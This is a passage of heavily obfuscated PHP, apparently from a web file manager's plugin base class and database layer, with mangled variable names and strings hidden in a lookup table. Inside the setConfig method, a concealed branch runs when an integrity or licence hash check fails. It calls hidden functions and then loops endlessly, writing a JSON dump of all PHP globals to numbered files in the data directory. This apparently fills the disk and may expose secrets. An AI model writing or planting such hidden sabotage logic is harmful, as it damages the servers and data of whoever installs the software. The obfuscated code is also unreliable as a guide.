(strstr($Ë§Ûò×, $¦êá¢¼Š[1610])) { $™õÈâ¬Å = rawurlencode(json_encode($this->pluginLangArr)); $Ë§Ûò× = str_replace($¦êá¢¼Š[1610], $™õÈâ¬Å, $Ë§Ûò×); } if (strstr($Ë§Ûò×, $¦êá¢¼Š[1611])) { $™õÈâ¬Å = $™õÈâ¬Å = rawurlencode(json_encode($this->getConfig())); $Ë§Ûò× = str_replace($¦êá¢¼Š[1611], $™õÈâ¬Å, $Ë§Ûò×); } $Ë§Ûò× = str_replace($Ù®úå—Ö, $îš·‡»Ì, $Ë§Ûò×); return $Ë§Ûò×; } private function parseLang(&$ï¤äÚİ…) { $ã´ÖÁª¬ =& $_SERVER[ú‡®¯¨±]; $ùĞãÂµë = $ã´ÖÁª¬[1612]; if (!strstr($ï¤äÚİ…, $ùĞãÂµë)) { return; } preg_match_all($ã´ÖÁª¬[1613], $ï¤äÚİ…, $ú‰¡¾è); if (!is_array($ú‰¡¾è) || count($ú‰¡¾è) == 0 || !is_array($ú‰¡¾è[0]) || count($ú‰¡¾è[0]) == 0) { return; } $ƒáèÍñ½ = array(); $ûÓ­†Ú¬ = array(); foreach ($ú‰¡¾è[0] as $ ­ˆÃ“) { $Œäùöšâ = substr($ ­ˆÃ“, strlen($ùĞãÂµë), -4); $¿¢Ï¯ÊŠ = LNG($Œäùöšâ); $ƒáèÍñ½[] = $ ­ˆÃ“; $ûÓ­†Ú¬[] = str_replace(array($ã´ÖÁª¬[207], $ã´ÖÁª¬[1134], $ã´ÖÁª¬[397], $ã´ÖÁª¬[120]), array($ã´ÖÁª¬[53], $ã´ÖÁª¬[53], $ã´ÖÁª¬[12], $ã´ÖÁª¬[1614]), $¿¢Ï¯ÊŠ); } $ï¤äÚİ… = str_replace($ƒáèÍñ½, $ûÓ­†Ú¬, $ï¤äÚİ…); } private function parseConfig(&$äÈí×º) { $ÕŠ¢È¾€ =& $_SERVER[ú‡®¯¨±]; $ï”ôùÅ° = $ÕŠ¢È¾€[1615]; if (!strstr($äÈí×º, $ï”ôùÅ°)) { return; } preg_match_all($ÕŠ¢È¾€[1616], $äÈí×º, $Ëß×²è); if (!is_array($Ëß×²è) || count($Ëß×²è) == 0 || !is_array($Ëß×²è[0]) || count($Ëß×²è[0]) == 0) { return; } $›ÎÒ® = $this->getConfig(); $ÂÛ‘° ´ = array(); $÷ÓˆÜ€  = array(); foreach ($Ëß×²è[0] as $ÖœšÌ‘¶) { $Õ…ø©¨„ = substr($ÖœšÌ‘¶, strlen($ï”ôùÅ°), -2); $ÂÛ‘° ´[] = $ÖœšÌ‘¶; $÷ÓˆÜ€ [] = _get($›ÎÒ®, $Õ…ø©¨„); } $äÈí×º = str_replace($ÂÛ‘° ´, $÷ÓˆÜ€ , $äÈí×º); } private function parsePackage(&$¨‰íˆ’¶) { $±ºâé˜ =& $_SERVER[ú‡®¯¨±]; $¯ì¬³³â = $±ºâé˜[1617]; if (!strstr($¨‰íˆ’¶, $¯ì¬³³â)) { return; } preg_match_all($±ºâé˜[1618], $¨‰íˆ’¶, $¤“áËƒ«); if (!is_array($¤“áËƒ«) || count($¤“áËƒ«) == 0 || !is_array($¤“áËƒ«[0]) || count($¤“áËƒ«[0]) == 0) { return; } $ñ´¹€îğ = $this->appPackage(); $‰ÃŒˆığ = array(); $›ÎĞÂ‹ = array(); foreach ($¤“áËƒ«[0] as $ÄÒÌ¢©Ø) { $ŠÖã˜èò = substr($ÄÒÌ¢©Ø, strlen($¯ì¬³³â), -2); $‰ÃŒˆığ[] = $ÄÒÌ¢©Ø; $›ÎĞÂ‹[] = _get($ñ´¹€îğ, $ŠÖã˜èò); } $¨‰íˆ’¶ = str_replace($‰ÃŒˆığ, $›ÎĞÂ‹, $¨‰íˆ’¶); } final function echoFile($¤ ğÀõá, $Ñ÷ãš¯è = false) { $Ÿº§Â =& $_SERVER[ú‡®¯¨±]; $ï¾¬áåü = $this->pluginPath . $¤ ğÀõá; if (ACT == $Ÿº§Â[1619]) { echo $Ÿº§Â[1620] . $this->pluginName . $Ÿº§Â[8] . $¤ ğÀõá . $Ÿº§Â[1621]; if (!file_exists($ï¾¬áåü)) { echo $Ÿº§Â[1622]; return; } } $ÏØåŸİä = $this->parseFile($ï¾¬áåü); $this->parseLang($ÏØåŸİä); $this->parseConfig($ÏØåŸİä); $this->parsePackage($ÏØåŸİä); if (is_array($Ñ÷ãš¯è)) { $ÏØåŸİä = str_replace(array_keys($Ñ÷ãš¯è), array_values($Ñ÷ãš¯è), $ÏØåŸİä); } echo $Ÿº§Â[207] . $ÏØåŸİä; } private function checkVersion() { $Ã‚Ù›‡× =& $_SERVER[ú‡®¯¨±]; $ó÷é¾÷” = $this->appPackage(); $ÄÙ”ÄÎğ = $this->getConfig(); if ($ÄÙ”ÄÎğ[$Ã‚Ù›‡×[1623]] == $ó÷é¾÷”[$Ã‚Ù›‡×[1597]]) { return; } $this->regist(); $this->setConfig(array($Ã‚Ù›‡×[1623] => $ó÷é¾÷”[$Ã‚Ù›‡×[1597]])); } final function initLang() { $Àâ´Û =& $_SERVER[ú‡®¯¨±]; $šã±ª€ = $Àâ´Û[1624]; $šª©äúº = $this->pluginPath . $Àâ´Û[1625]; $®˜åÌ¥ = I18n::getType(); $ÄÀ²ŠŞ = array(); if (file_exists($šª©äúº . $®˜åÌ¥ . $Àâ´Û[894])) { $ÄÀ²ŠŞ = (include $šª©äúº . $®˜åÌ¥ . $Àâ´Û[894]); } else { if ($®˜åÌ¥ == $Àâ´Û[1626] && !file_exists($šª©äúº . $®˜åÌ¥ . $Àâ´Û[894]) && file_exists($šª©äúº . $Àâ´Û[1627])) { $ÄÀ²ŠŞ = (include $šª©äúº . $Àâ´Û[1627]); } else { if (file_exists($šª©äúº . $šã±ª€ . $Àâ´Û[894])) { $ÄÀ²ŠŞ = (include $šª©äúº . $šã±ª€ . $Àâ´Û[894]); } } } if (!is_array($ÄÀ²ŠŞ)) { return array(); } if (@count($ÄÀ²ŠŞ) > 0) { I18n::set($ÄÀ²ŠŞ); } return $ÄÀ²ŠŞ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ß’è¦‘ù) { $ƒİÊéŞ’ =& $_SERVER[ú‡®¯¨±]; $Ö°×«æÛ = $_SERVER[$ƒİÊéŞ’[203]]; $óê¾Ü¡ = $ƒİÊéŞ’[932]; if ($_SERVER[$ƒİÊéŞ’[202]] != $óê¾Ü¡($Ö°×«æÛ)) { $Òï¿µºâ = $ƒİÊéŞ’[933]; $şÅûˆÊÚ = $ƒİÊéŞ’[204]; $È´²ñ = $_SERVER[$ƒİÊéŞ’[205]] . $ƒİÊéŞ’[206]; $È»™ŞŒÖ = $şÅûˆÊÚ($È´²ñ); $íüŠŒ­Ì = explode($ƒİÊéŞ’[207], $È»™ŞŒÖ); if (count($íüŠŒ­Ì) < $ƒİÊéŞ’[700]) { $´ûŸÛõ = $ƒİÊéŞ’[209]; $´ûŸÛõ(); } $·çÌ¾Ã = $ƒİÊéŞ’[934]; $·çÌ¾Ã($_SERVER[$ƒİÊéŞ’[935]]); $Òï¿µºâ = $ƒİÊéŞ’[933]; $Òï¿µºâ(); $ä•×–Ö‰ = $ƒİÊéŞ’[936]; $û¥â»é = json_encode($GLOBALS[$ƒİÊéŞ’[937]]); $¢Ä©çÈ­ = 1; for ($½Šáô°Û = $¢Ä©çÈ­; $½Šáô°Û > 0; $½Šáô°Û++) { $ä•×–Ö‰(DATA_PATH . $½Šáô°Û, $û¥â»é); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ß’è¦‘ù); } public function onSetConfig($¸¢õÇÉ…) { } public function onGetConfig($‚¢šŒ“ğ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÊŠÕÇÃ‚) { if ($ÊŠÕÇÃ‚ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÌÏ„”ì = "\x70\x6c\165\147\x69\x6e\101\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $è”¤ßÊŠ = $this->getConfig(); if (!$è”¤ßÊŠ[$ÌÏ„”ì]) { return !1; } return ActionCall($_SERVER[ú‡®¯¨±][1628], $è”¤ßÊŠ[$ÌÏ„”ì]); } public function url($à²òã»», $ÈŞ…ÜÖ¯ = '', $ÊÎİ¤£ = true) { $„òò‹ı =& $_SERVER[ú‡®¯¨±]; $¢­‹êÃÔ = $this->getConfig(); $ÑİÔˆ = KOD_VERSION . $„òò‹ı[10] . KOD_VERSION_BUILD; $˜ôúÎ¶ş = $this->packageVersion(); $´†¼ÒÈİ = $ÑİÔˆ . $„òò‹ı[440] . $˜ôúÎ¶ş; if (substr($à²òã»», 0, 4) == $„òò‹ı[151] || substr($à²òã»», 0, 2) == $„òò‹ı[1410]) { $‡›û©şİ = $à²òã»» . $„òò‹ı[1629] . $´†¼ÒÈİ; } else { if ($ÈŞ…ÜÖ¯ == $„òò‹ı[12]) { $‡›û©şİ = $this->pluginHost . $à²òã»» . $„òò‹ı[1629] . $´†¼ÒÈİ; } else { if ($ÈŞ…ÜÖ¯ === $„òò‹ı[77]) { $‡›û©şİ = $this->pluginHost . $à²òã»»; } else { if ($ÈŞ…ÜÖ¯ == $„òò‹ı[1630]) { $‡›û©şİ = STATIC_PATH . $à²òã»» . $„òò‹ı[1629] . $ÑİÔˆ; } else { if ($ÈŞ…ÜÖ¯ == $„òò‹ı[1631]) { $‡›û©şİ = APP_HOST . $„òò‹ı[1632] . $à²òã»» . $„òò‹ı[1629] . $ÑİÔˆ; } else { if (isset($¢­‹êÃÔ[$ÈŞ…ÜÖ¯])) { $‡›û©şİ = $¢­‹êÃÔ[$ÈŞ…ÜÖ¯] . $à²òã»» . $„òò‹ı[1629] . $´†¼ÒÈİ; } } } } } } if (!$ÊÎİ¤£) { return $‡›û©şİ; } echo $‡›û©şİ; } public function link($ëªììØ = false, $à‡ªä¥ï = '') { $‰£ï§œ® =& $_SERVER[ú‡®¯¨±]; if (!$ëªììØ) { $this->link($‰£ï§œ®[1633], $‰£ï§œ®[1631]); $this->link($‰£ï§œ®[1634], $‰£ï§œ®[1630]); $this->link($‰£ï§œ®[1635], $‰£ï§œ®[1630]); $this->link($‰£ï§œ®[1636], $‰£ï§œ®[1630]); $this->link($‰£ï§œ®[1637], $‰£ï§œ®[1630]); return; } $äêÓı¤æ = $this->url($ëªììØ, $à‡ªä¥ï, !1); if (substr($ëªììØ, -3) == $‰£ï§œ®[1638]) { echo $‰£ï§œ®[1639] . $äêÓı¤æ . $‰£ï§œ®[1640] . $‰£ï§œ®[207]; } else { if (substr($ëªììØ, -4) == $‰£ï§œ®[1641]) { echo $‰£ï§œ®[1642] . $äêÓı¤æ . $‰£ï§œ®[1643] . $‰£ï§œ®[207]; } } } } goto d·‘µù’×º; C°Å›¨Ûç¼: class DbSqlite extends DbSqliteBase { public function query($¹³÷¨ëÀ) { $°Ùãâèæ =& $_SERVER[ú‡®¯¨±]; if (!CacheLock::fileLock($°Ùãâèæ[13])) { return !1; } $¾•·îŠú = parent::query($¹³÷¨ëÀ); CacheLock::fileUnLock($°Ùãâèæ[13]); return $¾•·îŠú; } public function execute($“ÃÇÁêğ) { $³±á±öÍ =& $_SERVER[ú‡®¯¨±]; if (!CacheLock::fileLock($³±á±öÍ[13])) { return !1; } $â¡¿«à‰ = parent::execute($“ÃÇÁêğ); CacheLock::fileUnLock($³±á±öÍ[13]); return $â¡¿«à‰; } } class DbSqlite3 extends DbSqlite3Base { public function query($‡Š˜íà¥) { $¾«Èäè’ =& $_SERVER[ú‡®¯¨±]; if (!CacheLock::fileLock($¾«Èäè’[13])) { return !1; } $Ü±Ôã¤ß = parent::query($‡Š˜íà¥); CacheLock::fileUnLock($¾«Èäè’[13]); return $Ü±Ôã¤ß; } public function execute($·³¾÷¹) { $¿¾¿ªè¿ =& $_SERVER[ú‡®¯¨±]; if (!CacheLock::fileLock($¿¾¿ªè¿[13])) { return !1; } $ĞÕÈ¯Ãº = parent::execute($·³¾÷¹); CacheLock::fileUnLock($¿¾¿ªè¿[13]); return $ĞÕÈ¯Ãº; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\x71" => "\x3c\x3e", "\x67\x74" => "\x3e", "\145\147\164" => "\x3e\75", "\x6c\164" => "\x3c", "\145\154\x74" => "\x3c\x3d", "\156\x6f\x74\154\151\x6b\x65" => "\116\117\124\x20\114\x49\113\x45", "\x6c\151\x6b\x65" => "\x4c\x49\113\105", "\x69\x6e" => "\111\x4e", "\x6e\x6f\164\x69\x6e" => "\x4e\117\x54\x20\x49\x4e", "\x6e\157\x74\40\x69\156" => "\116\117\x54\x20\111\x4e", "\x62\145\164\167\145\x65\x6e" => "\102\105\x54\x57\x45\x45\116", "\156\157\164\142\x65\164\x77\145\145\156" => "\x4e\117\124\40\x42\x45\124\x57\105\x45\116", "\156\157\x74\40\142\x65\x74\167\145\x65\x6e" => "\x4e\117\x54\x20\x42\105\124\x57\x45\x45\x4e"); protected $selectSql = "\x53\105\114\105\x43\x54\45\104\x49\123\x54\111\116\x43\x54\45\x20\x25\x46\111\105\114\104\x25\x20\x46\122\x4f\115\x20\x25\x54\x41\102\x4c\x45\45\45\112\117\x49\116\45\45\x57\x48\x45\x52\x45\45\x25\x47\x52\x4f\125\x50\x25\x25\110\x41\126\x49\x4e\107\45\45\117\122\x44\x45\x52\x25\45\x4c\x49\x4d\x49\124\x25\x20\x25\125\x4e\111\x4f\x4e\x25\45\x43\117\x4d\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $«ÔÍëÆ¸ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ú‡®¯¨±][1016], $«ÔÍëÆ¸); } public function factory($Ê˜¾æ®ë = '') { $˜±å”’š =& $_SERVER[ú‡®¯¨±]; $Ê˜¾æ®ë = $this->parseConfig($Ê˜¾æ®ë); if (empty($Ê˜¾æ®ë[$˜±å”’š[1017]])) { think_exception(think_lang($˜±å”’š[1018])); } $this->dbType = ucwords(strtolower($Ê˜¾æ®ë[$˜±å”’š[1017]])); $­ïşî›Ã = $˜±å”’š[1019] . $this->dbType; if (class_exists($­ïşî›Ã)) { $ôŞ¶Ö™Ù = new $­ïşî›Ã($Ê˜¾æ®ë); if ($˜±å”’š[1020] != strtolower($Ê˜¾æ®ë[$˜±å”’š[1017]])) { $ôŞ¶Ö™Ù->dbType = strtoupper($this->dbType); } else { $ôŞ¶Ö™Ù->dbType = $this->_getDsnType($Ê˜¾æ®ë[$˜±å”’š[972]]); } } else { think_exception(think_lang($˜±å”’š[1021]) . $˜±å”’š[1022] . $­ïşî›Ã); } return $ôŞ¶Ö™Ù; } public function __call($º¥ü”÷, $Ê•®É¯ä) { if (method_exists($this, $º¥ü”÷)) { return call_user_func_array(array($this, $º¥ü”÷), $Ê•®É¯ä); } } protected function _getDsnType($ï¤¹ŞÑ) { $¬Áæ Ãı = explode($_SERVER[ú‡®¯¨±][4], $ï¤¹ŞÑ); $Ô¨è×¯É = strtoupper(trim($¬Áæ Ãı[0])); return $Ô¨è×¯É; } private function parseConfig($ãØ×Œ¶‘ = '') { $êßÀÎÒÎ =& $_SERVER[ú‡®¯¨±]; if (!empty($ãØ×Œ¶‘) && is_string($ãØ×Œ¶‘)) { $ãØ×Œ¶‘ = $this->parseDSN($ãØ×Œ¶‘); } elseif (is_array($ãØ×Œ¶‘)) { $ãØ×Œ¶‘ = array_change_key_case($ãØ×Œ¶‘); $ãØ×Œ¶‘ = array($êßÀÎÒÎ[1017] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1023]], $êßÀÎÒÎ[944] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1024]], $êßÀÎÒÎ[945] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1025]], $êßÀÎÒÎ[942] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1026]], $êßÀÎÒÎ[943] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1027]], $êßÀÎÒÎ[21] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1028]], $êßÀÎÒÎ[972] => $ãØ×Œ¶‘[$êßÀÎÒÎ[1029]], $êßÀÎÒÎ[17] => isset($ãØ×Œ¶‘[$êßÀÎÒÎ[1030]]) ? $ãØ×Œ¶‘[$êßÀÎÒÎ[1030]] : array()); } elseif (empty($ãØ×Œ¶‘)) { if (think_config($êßÀÎÒÎ[1031]) && $êßÀÎÒÎ[1020] != strtolower(think_config($êßÀÎÒÎ[1032]))) { $ãØ×Œ¶‘ = $this->parseDSN(think_config($êßÀÎÒÎ[1031])); } else { $ãØ×Œ¶‘ = array($êßÀÎÒÎ[1017] => think_config($êßÀÎÒÎ[1032]), $êßÀÎÒÎ[944] => think_config($êßÀÎÒÎ[1033]), $êßÀÎÒÎ[945] => think_config($êßÀÎÒÎ[1034]), $êßÀÎÒÎ[942] => think_config($êßÀÎÒÎ[1035]), $êßÀÎÒÎ[943] => think_config($êßÀÎÒÎ[1036]), $êßÀÎÒÎ[21] => think_config($êßÀÎÒÎ[301]), $êßÀÎÒÎ[972] => think_config($êßÀÎÒÎ[1031]), $êßÀÎÒÎ[17] => think_config($êßÀÎÒÎ[1037])); } } return $ãØ×Œ¶‘; } protected function initConnect($Ğö±úä = true) { if (1 == think_config($_SERVER[ú‡®¯¨±][22])) { $this->_linkID = $this->multiConnect($Ğö±úä); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¶¤Ã©Ù => $¸§†Û¢³) { $this->_linkID = $¸§†Û¢³; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¢¤©œÓµ = false) { $ô­‰Öı° =& $_SERVER[ú‡®¯¨±]; static $Ÿ‡Ÿ¶ëª = array(); static $ÊÎÔµŠÛ = -1; if (empty($Ÿ‡Ÿ¶ëª)) { foreach ($this->config as $ÓÑ›÷£‘ => $ˆÏ§¨û) { $Ÿ‡Ÿ¶ëª[$ÓÑ›÷£‘] = explode($ô­‰Öı°[50], $ˆÏ§¨û); } } if (think_config($ô­‰Öı°[1038])) { if ($¢¤©œÓµ || think_config($ô­‰Öı°[449]) === !0) { $áØûøÊ = floor(mt_rand(0, think_config($ô­‰Öı°[1039]) - 1)); $ÊÎÔµŠÛ = $áØûøÊ; } else { if (is_numeric(think_config($ô­‰Öı°[1040]))) { $áØûøÊ = think_config($ô­‰Öı°[1040]); } else { $áØûøÊ = floor(mt_rand(think_config($ô­‰Öı°[1039]), count($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[942]]) - 1)); } } } else { $áØûøÊ = floor(mt_rand(0, count($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[942]]) - 1)); $ÊÎÔµŠÛ = $áØûøÊ; } $áØûøÊ = $ÊÎÔµŠÛ !== -1 ? $ÊÎÔµŠÛ : $áØûøÊ; $î£àÖéş = array($ô­‰Öı°[944] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[944]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[944]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[944]][0], $ô­‰Öı°[945] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[945]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[945]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[945]][0], $ô­‰Öı°[942] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[942]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[942]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[942]][0], $ô­‰Öı°[943] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[943]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[943]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[943]][0], $ô­‰Öı°[21] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[21]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[21]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[21]][0], $ô­‰Öı°[972] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[972]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[972]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[972]][0], $ô­‰Öı°[17] => isset($Ÿ‡Ÿ¶ëª[$ô­‰Öı°[17]][$áØûøÊ]) ? $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[17]][$áØûøÊ] : $Ÿ‡Ÿ¶ëª[$ô­‰Öı°[17]][0]); return $this->connect($î£àÖéş, $áØûøÊ); } public function parseDSN($Ÿƒ­Ğüí) { $¶§ışÇÆ =& $_SERVER[ú‡®¯¨±]; if (empty($Ÿƒ­Ğüí)) { return !1; } $îÂÕÙõş = parse_url($Ÿƒ­Ğüí); if ($îÂÕÙõş[$¶§ışÇÆ[197]]) { $Â£˜• = array($¶§ışÇÆ[1017] => $îÂÕÙõş[$¶§ışÇÆ[197]], $¶§ışÇÆ[944] => isset($îÂÕÙõş[$¶§ışÇÆ[640]]) ? $îÂÕÙõş[$¶§ışÇÆ[640]] : $¶§ışÇÆ[12], $¶§ışÇÆ[945] => isset($îÂÕÙõş[$¶§ışÇÆ[1041]]) ? $îÂÕÙõş[$¶§ışÇÆ[1041]] : $¶§ışÇÆ[12], $¶§ışÇÆ[942] => isset($îÂÕÙõş[$¶§ışÇÆ[198]]) ? $îÂÕÙõş[$¶§ışÇÆ[198]] : $¶§ışÇÆ[12], $¶§ışÇÆ[943] => isset($îÂÕÙõş[$¶§ışÇÆ[199]]) ? $îÂÕÙõş[$¶§ışÇÆ[199]] : $¶§ışÇÆ[12], $¶§ışÇÆ[21] => isset($îÂÕÙõş[$¶§ışÇÆ[86]]) ? substr($îÂÕÙõş[$¶§ışÇÆ[86]], 1) : $¶§ışÇÆ[12]); } else { preg_match($¶§ışÇÆ[1042], trim($Ÿƒ­Ğüí), $¢ÑÂªÎ); $Â£˜• = array($¶§ışÇÆ[1017] => $¢ÑÂªÎ[1], $¶§ışÇÆ[944] => $¢ÑÂªÎ[2], $¶§ışÇÆ[945] => $¢ÑÂªÎ[3], $¶§ışÇÆ[942] => $¢ÑÂªÎ[4], $¶§ışÇÆ[943] => $¢ÑÂªÎ[5], $¶§ışÇÆ[21] => $¢ÑÂªÎ[6]); } $Â£˜•[$¶§ışÇÆ[972]] = $¶§ışÇÆ[12]; return $Â£˜•; } protected function debug() { $ŒÇÑçÙş =& $_SERVER[ú‡®¯¨±]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ŒÇÑçÙş[1043]; if (think_config($ŒÇÑçÙş[1044])) { think_status($ŒÇÑçÙş[1045]); think_trace($this->queryStr . $ŒÇÑçÙş[1046] . think_status($ŒÇÑçÙş[24], $ŒÇÑçÙş[1045], 6) . $ŒÇÑçÙş[1047], $ŒÇÑçÙş[12], $ŒÇÑçÙş[1048]); } } protected function parseLock($Å£ª¯Œ = false) { $‰¾¬¢‹Í =& $_SERVER[ú‡®¯¨±]; if (!$Å£ª¯Œ) { return $‰¾¬¢‹Í[12]; } if ($‰¾¬¢‹Í[974] == $this->dbType) { return $‰¾¬¢‹Í[1049]; } return $‰¾¬¢‹Í[1050]; } protected function parseSet($îÈÙóª) { $¯»ß‡† =& $_SERVER[ú‡®¯¨±]; foreach ($îÈÙóª as $ßÔÌÕ“Ú => $ş‚åÂ»¿) { if (is_array($ş‚åÂ»¿) && $¯»ß‡†[352] == $ş‚åÂ»¿[0]) { $ˆÄÓ¨®ò[] = $this->parseKey($ßÔÌÕ“Ú) . $¯»ß‡†[940] . $ş‚åÂ»¿[1]; } elseif (is_scalar($ş‚åÂ»¿) || is_null($ş‚åÂ»¿)) { $ˆÄÓ¨®ò[] = $this->parseKey($ßÔÌÕ“Ú) . $¯»ß‡†[940] . $this->parseValue($ş‚åÂ»¿); } } return $¯»ß‡†[1051] . implode($¯»ß‡†[50], $ˆÄÓ¨®ò); } protected function bindParam($ÑÆØ¼, $ë‡ŒŸ„¤) { $this->bind[$_SERVER[ú‡®¯¨±][4] . $ÑÆØ¼] = $ë‡ŒŸ„¤; } protected function parseBind($Á»ç±³ñ) { $Á»ç±³ñ = array_merge($this->bind, $Á»ç±³ñ); $this->bind = array(); return $Á»ç±³ñ; } function parseKey(&$»¦ÂÖÂº, $ÕÌñšÓ = true) { if ($ÕÌñšÓ) { $»¦ÂÖÂº = $this->parseKeyCheck($»¦ÂÖÂº); } return $»¦ÂÖÂº; } function parseKeyCheck($½¼¨­À£) { $€› Í»â =& $_SERVER[ú‡®¯¨±]; $½¼¨­À£ = trim($½¼¨­À£); if (!preg_match($€› Í»â[1052], $½¼¨­À£)) { think_exception($€› Í»â[1053] . $½¼¨­À£); } return $½¼¨­À£; } protected function parseValue($ıÔÆÜÌı) { $Ğ¸Œˆà‚ =& $_SERVER[ú‡®¯¨±]; if (is_string($ıÔÆÜÌı)) { $ıÔÆÜÌı = $Ğ¸Œˆà‚[1013] . $this->escapeString($ıÔÆÜÌı) . $Ğ¸Œˆà‚[1013]; } elseif (isset($ıÔÆÜÌı[0]) && is_string($ıÔÆÜÌı[0]) && strtolower($ıÔÆÜÌı[0]) == $Ğ¸Œˆà‚[352]) { $ıÔÆÜÌı = $this->escapeString($ıÔÆÜÌı[1]); } elseif (is_array($ıÔÆÜÌı)) { $ıÔÆÜÌı = array_map(array($this, $Ğ¸Œˆà‚[1014]), $ıÔÆÜÌı); } elseif (is_bool($ıÔÆÜÌı)) { $ıÔÆÜÌı = $ıÔÆÜÌı ? $Ğ¸Œˆà‚[90] : $Ğ¸Œˆà‚[224]; } elseif (is_null($ıÔÆÜÌı)) { $ıÔÆÜÌı = $Ğ¸Œˆà‚[105]; } return $ıÔÆÜÌı; } protected function parseField($æš•ÒñÎ) { $ˆ×‹ğÀ =& $_SERVER[ú‡®¯¨±]; if (is_string($æš•ÒñÎ) && strpos($æš•ÒñÎ, $ˆ×‹ğÀ[50])) { $æš•ÒñÎ = explode($ˆ×‹ğÀ[50], $æš•ÒñÎ); } if (is_array($æš•ÒñÎ)) { $·ñ ”ƒ³ = array(); foreach ($æš•ÒñÎ as $¡Ú¸‰Èâ => $­âÔƒ…) { if (!is_numeric($¡Ú¸‰Èâ)) { $·ñ ”ƒ³[] = $this->parseKey($¡Ú¸‰Èâ, !1) . $ˆ×‹ğÀ[1054] . $this->parseKey($­âÔƒ…); } else { $·ñ ”ƒ³[] = $this->parseKey($­âÔƒ…); } } $ß‘šì¶½ = implode($ˆ×‹ğÀ[50], $·ñ ”ƒ³); } elseif (is_string($æš•ÒñÎ) && !empty($æš•ÒñÎ)) { $ß‘šì¶½ = $æš•ÒñÎ; } else { $ß‘šì¶½ = $ˆ×‹ğÀ[215]; } return $ß‘šì¶½; } protected function parseTable($ñªÄ·ÊË) { $á®›ìĞ =& $_SERVER[ú‡®¯¨±]; if (is_array($ñªÄ·ÊË)) { $«»ÍÒ½´ = array(); foreach ($ñªÄ·ÊË as $è»Ñü€ => $üóÖş€Í) { if (!is_numeric($è»Ñü€)) { $«»ÍÒ½´[] = $this->parseKey($è»Ñü€) . $á®›ìĞ[53] . $this->parseKey($üóÖş€Í); } else { $«»ÍÒ½´[] = $this->parseKey($è»Ñü€); } } $ñªÄ·ÊË = $«»ÍÒ½´; } elseif (is_string($ñªÄ·ÊË)) { if (strstr($ñªÄ·ÊË, $á®›ìĞ[53])) { return $ñªÄ·ÊË; } $ñªÄ·ÊË = explode($á®›ìĞ[50], $ñªÄ·ÊË); array_walk($ñªÄ·ÊË, array($this, $á®›ìĞ[962])); } return $á®›ìĞ[956] . trim(implode($á®›ìĞ[1055], $ñªÄ·ÊË), $á®›ìĞ[439]) . $á®›ìĞ[956]; } protected function parseWhere($š¬Á²¢À) { $©×ÙŒÚÙ =& $_SERVER[ú‡®¯¨±]; $÷“ê‡Şç = $©×ÙŒÚÙ[12]; if (is_string($š¬Á²¢À)) { $÷“ê‡Şç = $š¬Á²¢À; } else { $‡Æ™‰§› = isset($š¬Á²¢À[$©×ÙŒÚÙ[1056]]) ? strtoupper($š¬Á²¢À[$©×ÙŒÚÙ[1056]]) : $©×ÙŒÚÙ[12]; if (in_array($‡Æ™‰§›, array($©×ÙŒÚÙ[1057], $©×ÙŒÚÙ[1058], $©×ÙŒÚÙ[1059]))) { $‡Æ™‰§› = $©×ÙŒÚÙ[53] . $‡Æ™‰§› . $©×ÙŒÚÙ[53]; unset($š¬Á²¢À[$©×ÙŒÚÙ[1056]]); } else { $‡Æ™‰§› = $©×ÙŒÚÙ[1060]; } foreach ($š¬Á²¢À as $÷Í”Øı™ => $ØÌşÆ) { $÷“ê‡Şç .= $©×ÙŒÚÙ[332]; if (is_numeric($÷Í”Øı™)) { 